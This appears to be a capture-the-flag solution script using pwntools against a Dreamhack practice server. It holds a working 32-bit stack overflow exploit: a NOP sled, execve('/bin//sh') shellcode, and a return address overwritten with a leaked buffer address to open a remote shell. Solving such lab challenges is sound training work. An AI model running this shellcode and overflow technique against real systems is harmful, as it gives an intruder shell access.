from pwn import *

p=remote('host1.dreamhack.games',23224)

#context.log_level="debug"
#context.terminal = ['/mnt/c/Users/a/wsl-terminal/open-wsl.exe','-e']

payload=""


payload+="\x90"*32
payload+="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\x31\xC0\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\xcd\x80" # 36bytes
payload+="\x90"*60
#payload+="A"*50
payload+="B"*4

p.recvuntil("buf = (")

buf_addr=int(p.recv(10),16)
log.info("buf_addr: "+hex(buf_addr))
payload+=p32(buf_addr)
payload+="\x90"*5

#raw_input()
p.send(payload)

#raw_input()

p.interactive()
